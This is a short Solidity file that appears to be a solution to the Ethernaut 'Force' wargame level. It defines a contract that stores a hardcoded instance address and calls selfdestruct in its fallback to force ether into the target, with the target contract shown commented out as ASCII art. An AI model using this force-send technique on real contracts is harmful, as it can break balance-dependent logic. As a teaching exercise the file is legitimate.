pragma solidity ^0.4.18;


/*
contract Force {

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

}
*/


contract sendAndDie {

    address forceAddress;

    function sendAndDie() payable{
    //Address for the force call on my ethernaut instance
        forceAddress = 0x1bdca7d97853decb73b6f069cefd9164c0c8c2af;
    }
    function() public{
        //A fallback
        selfdestruct(forceAddress);
    }
}